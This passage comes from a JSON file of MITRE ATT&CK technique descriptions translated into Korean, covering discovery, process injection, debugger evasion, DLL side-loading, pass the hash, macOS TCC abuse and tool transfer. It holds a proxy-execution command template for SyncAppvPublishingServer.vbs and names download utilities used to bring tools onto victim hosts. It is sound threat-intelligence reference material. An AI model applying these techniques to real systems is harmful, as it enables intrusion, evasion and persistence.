기술을 정당한 프로그램과 악성 Autostart 항목을 혼합하기 위해 위장 기법과 결합할 수 있습니다.",
    "external_id": "T1547.013",
    "modified": "2023-10-16T16:35:12.501Z",
    "translated": true
  },
  {
    "title": "Cloud Service Discovery",
    "description": "상대방은 접근 권한을 얻은 후 시스템에서 실행 중인 클라우드 서비스를 열거하려고 시도할 수 있습니다. 이러한 방법은 플랫폼 서비스(PaaS), 인프라 서비스(IaaS), 소프트웨어 서비스(SaaS)에 따라 다를 수 있습니다. 다양한 클라우드 제공업체에서는 지속적 통합 및 지속적 전달(CI/CD), Lambda 함수, Entra ID 등이 포함된 많은 서비스가 존재합니다. 또한 AWS GuardDuty 및 Microsoft Defender for Cloud와 같은 보안 서비스와 AWS CloudTrail 및 Google Cloud 감사 로그와 같은 로깅 서비스도 포함될 수 있습니다.\n\n상대방은 환경 내에서 활성화된 서비스에 대한 정보를 탐색하려고 시도할 수 있습니다. Microsoft Graph API 및 Azure Resource Manager API와 같은 Azure 도구와 API는 애플리케이션, 관리 그룹, 리소스 및 정책 정의, 그리고 해당 정의에 접근할 수 있는 아이덴티티와의 관계를 포함하여 리소스와 서비스를 열거할 수 있습니다.\n\n또한, Stormspotter는 Azure 리소스 및 서비스를 열거하고 그래프를 구성하기 위한 오픈 소스 도구이며, Pacu는 여러 가지 클라우드 서비스 탐색 방법을 지원하는 오픈 소스 AWS 악용 프레임워크입니다.\n\n상대방은 얻은 정보를 바탕으로 후속 행동을 형성할 수 있으며, 예를 들어 열거된 서비스에서 데이터나 자격 증명을 타겟으로 하거나 확인된 방어를 우회하려고 시도할 수 있습니다.",
    "external_id": "T1526",
    "modified": "2024-10-14T22:11:30.271Z",
    "translated": true
  },
  {
    "title": "Remote System Discovery",
    "description": "적대자는 현재 시스템에서 수평 이동을 위해 사용할 수 있는 네트워크의 다른 시스템 목록을 IP 주소, 호스트 이름 또는 기타 논리적 식별자를 통해 얻으려고 시도할 수 있습니다. 이를 가능하게 하는 기능은 원격 액세스 도구 내에 존재할 수 있지만, 운영 체제에서 제공되는 유틸리티(예: 핑 또는 net view 명령어)를 사용할 수도 있습니다.\n\n적대자는 또한 로컬 호스트 파일(예: C:\\Windows\\System32\\Drivers\\etc\\hosts 또는 /etc/hosts) 또는 다른 수동적인 방법(예: 로컬 ARP 캐시 항목)에서 데이터를 분석하여 환경에 원격 시스템의 존재를 발견할 수 있습니다.\n\n적대자는 또한 네트워크 인프라를 탐색하고, 네트워크 장치에서 CLI 명령어를 활용하여 네트워크 내 시스템에 대한 자세한 정보를 수집할 수 있습니다(예: show cdp neighbors, show arp).",
    "external_id": "T1018",
    "modified": "2023-08-14T19:08:59.741Z",
    "translated": true
  },
  {
    "title": "Network Service Discovery",
    "description": "적대자는 원격 호스트와 로컬 네트워크 인프라 장치에서 실행 중인 서비스 목록을 얻으려 할 수 있으며, 여기에는 원격 소프트웨어 취약점 공격에 취약할 수 있는 서비스도 포함됩니다. 이러한 정보를 얻기 위한 일반적인 방법에는 시스템으로 가져오는 도구를 사용한 포트 및/또는 취약성 스캔이 포함됩니다.\n\n클라우드 환경 내에서 적대자는 다른 클라우드 호스트에서 실행 중인 서비스를 발견하려 할 수 있습니다. 또한, 클라우드 환경이 온프레미스 환경과 연결되어 있을 경우, 적대자는 비클라우드 시스템에서 실행 중인 서비스도 식별할 수 있습니다.\n\nmacOS 환경 내에서 적대자는 네트워크 내의 다른 macOS 호스트에서 실행 중인 서비스를 발견하기 위해 기본 Bonjour 애플리케이션을 사용할 수 있습니다. Bonjour mDNSResponder 데몬은 호스트의 등록된 서비스를 자동으로 등록하고 네트워크에서 광고합니다. 예를 들어, 적대자는 mDNS 쿼리(예: <code>dns-sd -B _ssh._tcp .</code>)를 사용하여 ssh 서비스를 방송하는 다른 시스템을 찾을 수 있습니다.",
    "external_id": "T1046",
    "modified": "2023-08-11T21:10:09.547Z",
    "translated": true
  },
  {
    "title": "Domain Properties",
    "description": "적대자들은 목표 설정 시 사용할 수 있는 피해자의 네트워크 도메인에 대한 정보를 수집할 수 있습니다. 도메인 및 해당 속성에 대한 정보에는 피해자가 소유한 도메인, 관리 데이터(예: 이름, 등록자 등) 및 연락처(이메일 주소 및 전화번호), 비즈니스 주소, 네임 서버와 같은 보다 직접적인 실행 가능한 정보가 포함될 수 있습니다.\n\n적대자들은 이러한 정보를 여러 가지 방법으로 수집할 수 있으며, Active Scanning이나 Phishing for Information과 같은 직접적인 수집 작업을 통해 이루어질 수 있습니다. 피해자 도메인 및 그 속성에 대한 정보는 온라인 또는 기타 접근 가능한 데이터 집합을 통해 적대자에게 노출될 수도 있습니다. 서드파티 클라우드 제공업체가 사용되는 경우, 이 정보는 Office 365 환경의 GetUserRealm 및 autodiscover와 같은 공개적으로 사용 가능한 API 끝점을 통해 노출될 수 있습니다. 이러한 정보를 수집하면 다른 형태의 정찰 기회를 발견할 수 있으며(예: 공개 기술 데이터베이스 검색, 공개 웹사이트/도메인 검색, 또는 정보 피싱), 운영 자원을 설정하거나(예: 인프라 획득 또는 인프라 침해), 초기 접근을 시도할 수도 있습니다(예: 피싱).",
    "external_id": "T1590.001",
    "modified": "2022-10-21T14:32:05.257Z",
    "translated": true
  },
  {
    "title": "Software Discovery",
    "description": "적대자는 시스템이나 클라우드 환경에 설치된 소프트웨어 및 소프트웨어 버전의 목록을 얻으려고 시도할 수 있다. 적대자는 자동화된 탐색 중 소프트웨어 발견 정보를 활용하여 후속 행동을 조정할 수 있으며, 여기에는 적대자가 목표를 완전히 감염시키는지 또는 특정 행동을 시도하는지가 포함된다.\n\n이러한 소프트웨어는 구성 관리 또는 보안상의 이유로 환경 전반에 걸쳐 널리 배포될 수 있으며, 적대자에게 장치를 감염시키거나 측면 이동을 할 수 있는 폭넓은 접근을 허용할 수 있다.\n\n적대자는 다양한 이유로 소프트웨어를 나열하려고 시도할 수 있는데, 예를 들어 어떤 보안 조치가 있는지 파악하거나 감염된 시스템에 취약한 소프트웨어 버전이 있는지 확인하기 위함일 수 있다.",
    "external_id": "T1518",
    "modified": "2024-04-16T00:16:06.689Z",
    "translated": true
  },
  {
    "title": "Cloud Service Dashboard",
    "description": "적대자는 도용한 자격 증명을 사용하여 클라우드 서비스 대시보드 GUI에 접근함으로써 운영 중인 클라우드 환경에서 특정 서비스, 자원 및 기능과 같은 유용한 정보를 얻을 수 있습니다. 환경의 구성에 따라 적대자는 API를 통해 얻을 수 있는 것보다 그래픽 대시보드를 통해 더 많은 정보를 열거할 수 있습니다. 이는 적대자가 API 요청을 하지 않고도 정보를 얻을 수 있게 합니다.",
    "external_id": "T1538",
    "modified": "2024-10-15T15:51:56.279Z",
    "translated": true
  },
  {
    "title": "Thread Local Storage",
    "description": "상대방은 프로세스 기반 방어를 회피하고 권한을 상승시킬 수 있도록 스레드 지역 저장소(TLS) 콜백을 통해 프로세스에 악성 코드를 주입할 수 있습니다. TLS 콜백 주입은 별도의 실행 중인 프로세스의 주소 공간에서 임의의 코드를 실행하는 방법입니다.\n\nTLS 콜백 주입은 포터블 실행 파일(PE) 내의 포인터를 조작하여 프로세스를 정당한 진입점에 도달하기 전에 악성 코드로 리디렉션하는 방식입니다. TLS 콜백은 일반적으로 운영 체제가 스레드에서 사용하는 데이터를 설정하거나 정리하는 데 사용됩니다. TLS 콜백을 조작하는 것은 프로세스의 메모리 공간 내에서 특정 오프셋에 할당하고 쓰는 방법으로 수행될 수 있으며, 이는 다른 프로세스 주입 기술을 사용하여 이루어질 수 있습니다.\n\n다른 프로세스의 맥락에서 코드를 실행하면 프로세스의 메모리, 시스템/네트워크 자원에 접근할 수 있을 뿐만 아니라 권한이 상승할 수 있습니다. TLS 콜백 주입을 통한 실행은 실행이 정당한 프로세스 아래에서 은폐되기 때문에 보안 제품의 탐지를 피할 수 있습니다.",
    "external_id": "T1055.005",
    "modified": "2021-10-18T12:24:54.198Z",
    "translated": true
  },
  {
    "title": "Debugger Evasion",
    "description": "적은 다양한 수단을 사용하여 디버거를 감지하고 회피할 수 있습니다. 디버거는 일반적으로 수비자가 잠재적인 악성 코드 페이로드의 실행을 추적하거나 분석하는 데 사용됩니다.\n\n디버거 회피는 디버거 환경을 나타내는 아티팩트의 존재에 대한 검사의 결과에 따라 행동을 변경하는 것을 포함할 수 있습니다. 적이 디버거를 감지하면 그들은 악성 코드를 수정하여 피해자와의 연결을 끊거나 임플란트의 핵심 기능을 숨길 수 있습니다. 또한, 추가 페이로드를 배포하기 전에 디버거 아티팩트를 검색할 수도 있습니다.\n\n특정 검사는 목표와 적에 따라 다를 수 있지만, <code>IsDebuggerPresent()</code> 및 <code>NtQueryInformationProcess()</code>와 같은 네이티브 API 호출이나 프로세스 환경 블록(PEB)의 <code>BeingDebugged</code> 플래그를 수동으로 확인하는 것이 포함될 수 있습니다. 디버깅 아티팩트에 대한 다른 검사는 하드웨어 중단점, 인터럽트 어셈블리 명령어, 시간 검사 또는 현재 프로세스에서 예외가 발생했을 경우 측정을 열거할 수도 있습니다(존재하는 디버거가 잠재적인 오류를 \"소화\"하거나 처리한다고 가정).\n\n적들은 자동화된 발견 중 이러한 디버거 검사에서 학습한 정보를 사용하여 후속 행동을 결정할 수 있습니다. 디버거는 프로세스를 분리하거나 반복하는 네이티브 API 호출을 통해 무의미한 데이터로 디버그 로그를 채워서 회피할 수 있습니다.",
    "external_id": "T1622",
    "modified": "2022-04-16T15:05:55.918Z",
    "translated": true
  },
  {
    "title": "Space after Filename",
    "description": "적대자는 파일의 확장자를 변경하여 프로그램의 실제 파일 유형을 숨길 수 있습니다. 특정 파일 유형(특히 .app 확장자는 해당되지 않음)의 경우, 파일 이름 끝에 공백을 추가하면 운영 체제가 파일을 처리하는 방식이 변경됩니다.\n\n예를 들어, <code>evil.bin</code>이라는 Mach-O 실행 파일이 있을 때, 사용자가 이 파일을 두 번 클릭하면 Terminal.app이 실행되고 코드가 실행됩니다. 이 파일의 이름을 <code>evil.txt</code>로 변경하면, 사용자가 두 번 클릭했을 때 기본 텍스트 편집 응용 프로그램으로 열리게 되어 이진 파일이 실행되지 않습니다. 그러나 파일 이름을 <code>evil.txt </code>로 변경하면(공백이 끝에 있다는 점에 유의), 사용자가 두 번 클릭했을 때 운영 체제가 실제 파일 유형을 결정하고 적절히 처리하며 이진 파일이 실행됩니다.\n\n적대자는 이 기능을 사용해 사용자들이 맞지 않는 형식의 무해한 파일을 두 번 클릭하도록 속이고 궁극적으로 악의적인 코드를 실행하게 할 수 있습니다.",
    "external_id": "T1036.006",
    "modified": "2023-03-30T21:01:52.873Z",
    "translated": true
  },
  {
    "title": "Re-opened Applications",
    "description": "적대적인 요소는 plist 파일을 수정하여 사용자가 로그인할 때 자동으로 애플리케이션을 실행하도록 할 수 있습니다. 사용자가 로그아웃하거나 macOS 그래픽 사용자 인터페이스(GUI)를 통해 재부팅할 때, \"로그인할 때 창 다시 열기\"라는 체크박스가 있는 프롬프트가 사용자에게 제공됩니다. 선택할 경우, 현재 열려 있는 모든 애플리케이션이 <code>~/Library/Preferences/ByHost</code> 디렉토리에 있는 <code>com.apple.loginwindow.[UUID].plist</code>라는 속성 목록 파일에 추가됩니다. 이 파일에 나열된 애플리케이션은 사용자가 다음에 로그인할 때 자동으로 다시 열립니다.\n\n적대적인 요소는 악성 애플리케이션 경로를 <code>com.apple.loginwindow.[UUID].plist</code> 파일에 추가하여 사용자가 로그인할 때 페이로드를 실행함으로써 지속성을 확립할 수 있습니다.",
    "external_id": "T1547.007",
    "modified": "2022-04-19T23:46:56.443Z",
    "translated": true
  },
  {
    "title": "SEO Poisoning",
    "description": "적대자는 잠재적인 희생자를 유인하기 위해 검색 엔진 최적화(SEO)에 영향을 주는 메커니즘을 오염시킬 수 있습니다. 검색 엔진은 일반적으로 구매한 광고와 웹 크롤러 및 알고리즘에 의해 계산된 사이트의 순위/점수/평판에 따라 사용자에게 결과를 표시합니다.\n\n[Drive-by Compromise]를 촉진하기 위해 적대자는 검색 엔진 내에서 악성 payload를 호스팅하는 사이트를 홍보하기 위해 SEO 순위를 명시적으로 조작하는 콘텐츠를 조작할 수 있습니다. SEO 순위를 오염시키는 것은 손상된 사이트에 키워드를 채우는 등의 여러 가지 기법을 포함할 수 있습니다. 이 키워드는 의도된 희생자의 관심사/브라우징 습관과 보다 넓고 계절적으로 인기 있는 주제(예: 선거, 트렌드 뉴스)와 관련이 있을 수 있습니다.\n\n인터넷 검색 엔진(예: 구글) 외에도, 적대자는 개발자 플랫폼(예: GitHub)의 특정 사이트 내 검색을 조작하여 사용자를 [Supply Chain Compromise] 유인으로 유도할 수도 있습니다. 사이트 내 검색은 자체 알고리즘과 인기와 같은 메트릭에 따라 검색 결과를 순위를 매기며, 이는 악의적인 행위자에 의해 타겟팅되고 조작될 수 있습니다.\n\n적대자는 또한 사이트의 계산된 관련성과 평판을 높이기 위해 조작된 기능으로의 링크를 구매하거나 심을 수 있습니다.\n\nSEO 오염은 또한 감시를 피하기 위해 SEO 입력을 제공하면서 회피성 리디렉션 및 기타 은폐 메커니즘(예: 마우스 움직임 측정 또는 브라우저 사용자 에이전트, 사용자 언어/지역화 설정 또는 HTTP 헤더에 따라 콘텐츠 제공)과 결합될 수 있습니다.",
    "external_id": "T1608.006",
    "modified": "2024-08-14T15:03:56.383Z",
    "translated": true
  },
  {
    "title": "Pass the Hash",
    "description": "적대자는 도난당한 비밀번호 해시를 사용하여 시스템 접근 제어를 우회하면서 환경 내에서 측면 이동을 할 수 있습니다. 패스 더 해시(PtH)는 사용자의 평문 비밀번호에 접근하지 않고 사용자로 인증하는 방법입니다. 이 방법은 평문 비밀번호를 요구하는 표준 인증 절차를 우회하고, 비밀번호 해시를 사용하는 인증 부분으로 직접 이동합니다.\n\nPtH를 수행할 때, 사용 중인 계정의 유효한 비밀번호 해시를 자격 증명 접근 기술을 사용하여 캡처합니다. 캡처된 해시는 PtH와 함께 사용되어 해당 사용자로 인증됩니다. 인증이 완료되면, PtH는 로컬 또는 원격 시스템에서 작업을 수행하는 데 사용할 수 있습니다.\n\n적대자는 도난당한 비밀번호 해시를 사용하여 \"오버패스 더 해시\"를 수행할 수도 있습니다. 이는 PtH와 유사하게 비밀번호 해시를 사용하여 사용자로 인증하는 과정이지만, 비밀번호 해시를 사용하여 유효한 Kerberos 티켓을 생성하는 것도 포함됩니다. 이 티켓은 이후 패스 더 티켓 공격을 수행하는 데 사용될 수 있습니다.",
    "external_id": "T1550.002",
    "modified": "2023-07-28T18:24:16.246Z",
    "translated": true
  },
  {
    "title": "Exfiltration Over Physical Medium",
    "description": "적대자는 이동식 드라이브와 같은 물리적 매체를 통해 데이터를 유출하려고 시도할 수 있습니다. 공기 차단 네트워크가 손상되는 등의 특정 상황에서는 사용자가 도입한 물리적 매체나 장치를 통해 유출이 발생할 수 있습니다. 이러한 매체는 외장 하드 드라이브, USB 드라이브, 셀룰러폰, MP3 플레이어 또는 기타 이동식 저장 및 처리 장치일 수 있습니다. 물리적 매체나 장치는 최종 유출 지점으로 사용되거나 서로 연결되지 않은 시스템 간에 이동하는 데 사용될 수 있습니다.",
    "external_id": "T1052",
    "modified": "2021-10-15T22:48:29.702Z",
    "translated": true
  },
  {
    "title": "DLL Side-Loading",
    "description": "적대자는 DLL을 사이드 로딩하여 자신의 악성 페이로드를 실행할 수 있습니다. DLL 검색 순서 하이재킹과 유사하게, 사이드 로딩은 프로그램이 어떤 DLL을 로드하는지를 제어하는 것을 포함합니다. 그러나 프로그램의 검색 순서 내에 DLL을 심어두고 피해 애플리케이션이 실행되기를 기다리는 것과는 달리, 적대자는 합법적인 애플리케이션을 심은 다음 이를 실행하여 자신의 페이로드를 직접 사이드 로딩할 수 있습니다.\n\n사이드 로딩은 로더가 사용하는 DLL 검색 순서를 이용하여 피해 애플리케이션과 악성 페이로드를 나란히 배치합니다. 적대자는 합법적이고 신뢰할 수 있으며 잠재적으로 권한이 상승된 시스템이나 소프트웨어 프로세스 아래에서 수행하는 행동을 숨기기 위한 수단으로 사이드 로딩을 사용할 가능성이 높습니다. 페이로드를 사이드 로딩하는 데 사용되는 일반적인 실행 파일은 전달 및/또는 실행 중에 차단되지 않을 수 있습니다. 적대자의 페이로드는 신뢰할 수 있는 프로세스의 메모리에 로드될 때까지 암호화되거나 패킹되거나 다른 방법으로 난독화될 수 있습니다.",
    "external_id": "T1574.002",
    "modified": "2023-03-30T21:01:47.241Z",
    "translated": true
  },
  {
    "title": "Ingress Tool Transfer",
    "description": "적대자는 외부 시스템에서 손상된 환경으로 도구나 기타 파일을 전송할 수 있습니다. 도구나 파일은 외부 적대자가 제어하는 시스템에서 희생자 네트워크로 명령 및 제어 채널이나 다른 프로토콜을 통해 복사될 수 있습니다. 일단 존재하게 되면, 적대자는 손상된 환경 내의 희생자 장치 간에 도구를 전송하거나 확산시킬 수 있습니다.\n\nWindows에서는 적대자가 도구를 다운로드하기 위해 `copy`, `finger`, `certutil`, `PowerShell` 명령과 같은 다양한 유틸리티를 사용할 수 있습니다. Linux 및 macOS 시스템에서도 `curl`, `scp`, `sftp`, `tftp`, `rsync`, `finger`, `wget`와 같은 다양한 유틸리티가 존재합니다.\n\n적대자는 또한 `yum`이나 `winget`과 같은 설치 프로그램 및 패키지 관리자를 남용하여 희생자 호스트에 도구를 다운로드할 수 있습니다. 또한, 적대자는 Windows의 `search-ms` 프로토콜 핸들러와 같은 파일 애플리케이션 기능을 남용하여, 원격 파일 검색을 통해 희생자에게 악성 파일을 전달할 수 있습니다.\n\n파일은 다양한 웹 서비스와 희생자 시스템에 존재하는 기본 도구를 이용하여 전송될 수도 있습니다. 경우에 따라, 적대자는 Dropbox나 OneDrive와 같은 웹 기반 클라이언트와 온프레미스 클라이언트 간에 동기화되는 서비스를 이용하여 파일을 희생자 시스템으로 전송할 수 있습니다. 예를 들어, 클라우드 계정을 손상시키고 서비스의 웹 포털에 로그인함으로써 적대자는 자동 동기화 프로세스를 트리거하여 파일을 희생자의 머신으로 전송할 수 있습니다.",
    "external_id": "T1105",
    "modified": "2024-04-11T15:08:01.731Z",
    "translated": true
  },
  {
    "title": "SyncAppvPublishingServer",
    "description": "적대자는 SyncAppvPublishingServer.vbs를 악성 PowerShell 명령 실행의 프록시로 악용할 수 있습니다. SyncAppvPublishingServer.vbs는 Windows가 애플리케이션을 가상화하는 방식(마이크로소프트 애플리케이션 가상화, 또는 App-V)과 관련된 비주얼 베이직 스크립트입니다. 예를 들어, Windows는 Win32 애플리케이션을 사용자에게 가상 애플리케이션으로 제공하여 사용자가 이를 로컬에 설치된 것처럼 실행하고 상호작용할 수 있도록 합니다. \n\nSyncAppvPublishingServer.vbs 스크립트는 정품으로, 마이크로소프트의 서명이 있을 수 있으며, 일반적으로 `\\System32`에서 명령줄을 통해 `wscript.exe`로 실행됩니다.\n\n적대자는 SyncAppvPublishingServer.vbs를 이용해 PowerShell 실행 제한을 우회하고 '지형을 이용해 살아가는' 방식으로 방어적 대응 수단을 피할 수 있습니다. 실행 프록시는 `powershell.exe`를 직접 호출하는 대신 신뢰받는/서명된 대안으로 기능할 수 있습니다.\n\n예를 들어, PowerShell 명령은 다음과 같이 호출될 수 있습니다:\n\n`SyncAppvPublishingServer.vbs \"n; {PowerShell}\"`",
    "external_id": "T1216.002",
    "modified": "2024-09-12T19:42:21.547Z",
    "translated": true
  },
  {
    "title": "Additional Email Delegate Permissions",
    "description": "적대자는 지속적으로 적대자가 제어하는 이메일 계정에 접근할 수 있도록 추가 권한 수준을 부여할 수 있습니다.\n\n예를 들어, 온프레미스 Exchange와 클라우드 기반 서비스인 Office 365에서 사용할 수 있는 <code>Add-MailboxPermission</code> PowerShell 명령은 메일박스에 권한을 추가합니다. Google Workspace에서는 Google 관리 콘솔을 통해 위임을 활성화할 수 있으며, 사용자는 Gmail 설정에서 계정을 위임할 수 있습니다.\n\n적대자는 또한 개별 폴더 권한이나 역할을 통해 메일박스 폴더 권한을 부여할 수 있습니다. Office 365 환경에서 적대자는 정보 저장소의 최상위(root), 받은 편지함 또는 기타 메일박스 폴더에 대해 기본(Default) 또는 익명(Anonymous) 사용자 권한 또는 역할을 부여할 수 있습니다. 한 폴더에 대해 하나 또는 두 개의 사용자 권한을 부여함으로써, 적대자는 테넌트의 다른 계정을 사용하여 목표 사용자의 메일 폴더에 지속적으로 접근할 수 있습니다.\n\n이 방법은 지속적인 위협 사건 및 비즈니스 이메일 침해(BEC) 사건에서 사용될 수 있으며, 적대자는 침해하고자 하는 계정에 추가 클라우드 역할을 추가할 수 있습니다. 이는 시스템에 접근하기 위한 추가 기술을 사용하는 데도 도움이 될 수 있습니다. 예를 들어, 침해된 비즈니스 계정은 종종 목표 비즈니스의 네트워크에 있는 다른 계정으로 메시지를 전송하는 데 사용되며, 받은 편지함 규칙을 설정하여 메시지가 스팸 또는 피싱 탐지 메커니즘을 피하도록 만듭니다.",
    "external_id": "T1098.002",
    "modified": "2024-10-15T15:37:25.303Z",
    "translated": true
  },
  {
    "title": "Code Signing Certificates",
    "description": "적대 세력은 타겟팅 중에 사용할 수 있는 코드 서명 인증서를 구매하거나 훔칠 수 있습니다. 코드 서명이란 실행 파일 및 스크립트에 디지털 서명을 하여 소프트웨어 작성자를 확인하고 코드가 변경되거나 손상되지 않았음을 보장하는 과정입니다. 코드 서명은 개발자로부터 프로그램의 진정성 수준을 제공하고 프로그램이 변조되지 않았음을 보장합니다. 사용자 및 보안 도구는 인증서를 발급한 주체나 작성자가 누구인지 모르더라도 서명된 코드 조각을 서명되지 않은 코드 조각보다 더 신뢰할 수 있습니다.\n\n코드 서명 전에 적대 세력은 작전에 사용하기 위해 코드 서명 인증서를 구매하거나 훔칠 수 있습니다. 코드 서명 인증서 구매는 전면 조직을 이용하거나 이전에 손상된 엔터티에서 훔친 정보를 사용하여 적대 세력이 해당 엔터티로서 인증서 공급자에게 신뢰성을 입증할 수 있도록 할 수 있습니다. 적대 세력은 또한 손상된 제3자로부터 직접 코드 서명 자료를 훔칠 수 있습니다.",
    "external_id": "T1588.003",
    "modified": "2021-10-17T16:19:50.018Z",
    "translated": true
  },
  {
    "title": "Serverless Execution",
    "description": "적대자들은 서버리스 컴퓨팅, 통합 및 자동화 서비스를 악용하여 클라우드 환경에서 임의의 코드를 실행할 수 있습니다. 많은 클라우드 제공업체는 컴퓨팅 엔진, 애플리케이션 통합 서비스 및 웹 서버를 포함한 다양한 서버리스 리소스를 제공합니다.\n\n적대자들은 이러한 리소스를 임의의 명령을 실행하는 수단으로 여러 가지 방식으로 악용할 수 있습니다. 예를 들어, 적대자들은 서버리스 함수를 사용하여 암호화폐 채굴 악성코드와 같은 악성 코드를 실행할 수 있습니다. 적대자들은 또한 클라우드 환경의 추가 손상을 가능하게 하는 함수를 생성할 수 있습니다. 예를 들어, 적대자는 AWS의 `IAM:PassRole` 권한이나 Google Cloud의 `iam.serviceAccounts.actAs` 권한을 사용하여 서버리스 클라우드 함수에 추가 클라우드 역할을 추가할 수 있으며, 이는 원래 사용자가 수행할 수 없는 작업을 수행할 수 있게 됩니다.\n\n서버리스 함수는 클라우드 이벤트에 응답하여 호출될 수 있으며, 이는 시간에 걸쳐 지속적인 실행을 가능하게 합니다. 예를 들어, AWS 환경에서 적대자는 새로운 사용자가 생성될 때마다 해당 함수가 호출되도록 하는 CloudWatch 이벤트 규칙과 함께 사용자를 자동으로 추가하는 Lambda 함수를 생성할 수 있습니다. 이는 많은 클라우드 기반 오피스 애플리케이션에서도 가능합니다. 예를 들어, Microsoft 365 환경에서 적대자는 사용자가 받거나 생성하는 모든 이메일을 전달하거나 사용자가 SharePoint의 문서에 접근할 때마다 익명 공유 링크를 생성하는 Power Automate 워크플로우를 만들 수 있습니다. Google Workspace 환경에서는 사용자가 파일을 열 때 데이터를 유출하는 Apps Script를 생성할 수 있습니다.",
    "external_id": "T1648",
    "modified": "2024-10-14T22:11:30.271Z",
    "translated": true
  },
  {
    "title": "TCC Manipulation",
    "description": "공격자는 투명성, 동의 및 제어(TCC) 서비스나 데이터베이스를 조작하거나 악용하여 악성 실행 파일에 높은 권한을 부여할 수 있습니다. TCC는 macOS의 개인정보 및 보안 제어 메커니즘으로, 실행 중인 프로세스가 화면 공유, 카메라, 마이크 또는 전체 디스크 접근(FDA)과 같은 TCC에 의해 보호되는 데이터나 서비스에 접근할 권한이 있는지를 결정합니다.\n\n애플리케이션이 TCC에 의해 보호되는 데이터나 서비스에 접근을 요청하면, TCC 데몬(`tccd`)이 `/Library/Application Support/com.apple.TCC/TCC.db` (및 `~/`의 동등한 위치)에 있는 TCC 데이터베이스를 확인하고 MDM에 연결된 경우 사용자 권한을 덮어쓰는 파일을 체크합니다. 권한이 존재하지 않으면 사용자에게 권한을 부여하라는 메시지가 표시됩니다. 권한이 부여되면 데이터베이스는 애플리케이션의 권한을 저장하고, 재설정되지 않는 한 사용자에게 다시 요청하지 않습니다. 예를 들어, 웹 브라우저가 사용자의 웹캠에 대한 권한을 요청하면, 권한이 부여된 후에는 웹 브라우저가 사용자에게 다시 명시적으로 요청하지 않을 수 있습니다.\n\n공격자는 프로세스 주입을 통해 이전에 권한이 부여된 애플리케이션을 악용하거나 다른 애플리케이션을 사용하여 악성 이진 파일을 실행함으로써 TCC에 의해 보호되는 제한된 데이터나 서비스에 접근할 수 있습니다. 예를 들어, 공격자는 FDA 권한이 있는 macOS 기본 앱인 Finder를 사용하여 악성 애플스크립트를 실행할 수 있습니다. Finder 앱에서 실행할 때, 악성 애플스크립트는 사용자 프롬프트 없이 시스템의 모든 파일에 대한 접근 권한을 상속받습니다. 시스템 무결성 보호(SIP)가 비활성화되면 TCC 보호도 비활성화됩니다. SIP가 활성화되지 않은 시스템에서는 공격자가 환경 변수를 사용하여 공격자가 제어하는 TCC 데이터베이스를 로드함으로써 자신의 악성 실행 파일에 권한을 추가하기 위해 TCC 데이터베이스를 조작할 수 있습니다.",
    "external_id": "T1548.006",
    "modified": "2024-10-16T16:54:56.714Z",
    "translated": true
  },
  {
    "title": "Ptrace System Calls",
    "description": "적대자는 ptrace(프로세스 추적) 시스템 호출을 통해 프로세스에 악성 코드를 주입하여 프로세스 기반 방어를 회피하고 권한을 상승시킬 수 있습니다. Ptrace 시스템 호출 주입은 별도의 실행 중인 프로세스의 주소 공간에서 임의의 코드를 실행하는 방법입니다.\n\nPtrace 시스템 호출 주입은 실행 중인 프로세스에 연결하고 이를 수정하는 과정을 포함합니다. ptrace 시스템 호출은 디버깅 프로세스가 다른 프로세스(및 각 개별 스레드)를 관찰하고 제어할 수 있도록 하며, 메모리 및 레지스터 값을 변경하는 것을 포함합니다. Ptrace 시스템 호출 주입은 일반적으로 실행 중인 프로세스에 임의의 코드를 작성한 다음 <code>PTRACE_SETREGS</code>를 호출하여 다음에 실행할 명령어를 포함하는 레지스터를 설정하는 방식으로 수행됩니다. Ptrace 시스템 호출 주입은 <code>PTRACE_POKETEXT</code>/<code>PTRACE_POKEDATA</code>를 사용하여도 수행할 수 있으며, 이는 특정 주소에 있는 대상 프로세스의 메모리로 데이터를 복사합니다.\n\nPtrace 시스템 호출 주입은 자식 프로세스가 아니거나 더 높은 권한을 가진 프로세스를 타겟으로 할 경우 불가능할 수 있습니다.\n\n다른 프로세스의 컨텍스트에서 코드를 실행하면 프로세스의 메모리, 시스템/네트워크 리소스에 접근할 수 있으며, 권한 상승이 가능할 수 있습니다. Ptrace 시스템 호출 주입을 통한 실행은 정당한 프로세스 아래에서 수행되므로 보안 제품의 탐지를 회피할 수 있습니다.",
    "external_id": "T1055.008",
    "modified": "2021-10-18T12:26:31.766Z",
    "translated": true
  },
  {
    "title": "Power Settings",
    "description": "적대자는 감염된 시스템에 대한 접근을 연장하기 위해 시스템의 하이버네이트, 재부팅 또는 종료 능력을 저해할 수 있습니다. 컴퓨터가 휴면 상태에 들어가면 일부 또는 모든 소프트웨어와 하드웨어가 작동을 멈출 수 있으며, 이는 악성 활동을 방해할 수 있습니다.\n\n적대자들은 시스템 유틸리티 및 구성 설정을 남용하여 악성 활동을 종식시킬 수 있는 상태, 예를 들어 대기 모드에 들어가는 것을 방지함으로써 접근을 유지할 수 있습니다.\n\n예를 들어, `powercfg`는 Windows 시스템 상의 모든 구성 가능한 전원 시스템 설정을 제어하며, 감염된 호스트가 잠기거나 종료되지 않도록 방지하는 데 남용될 수 있습니다. 적대자들은 시스템 잠금 화면 타임아웃 설정을 연장할 수도 있습니다. 디스크 및 하이버네이트 타임아웃과 같은 다른 관련 설정도 비슷하게 남용될 수 있어, 사용자가 활동하지 않더라도 감염된 머신이 계속 작동하도록 할 수 있습니다.\n\n일부 악성코드가 시스템 재부팅을 견딜 수 없다는 사실을 인지한 적대자들은 시스템 종료 또는 재부팅을 유도하는 데 사용되는 파일을 완전히 삭제할 수 있습니다.",
    "external_id": "T1653",
    "modified": "2024-10-16T20:11:40.334Z",
    "translated": true
  },
  {
    "title": "Dynamic API Resolution",
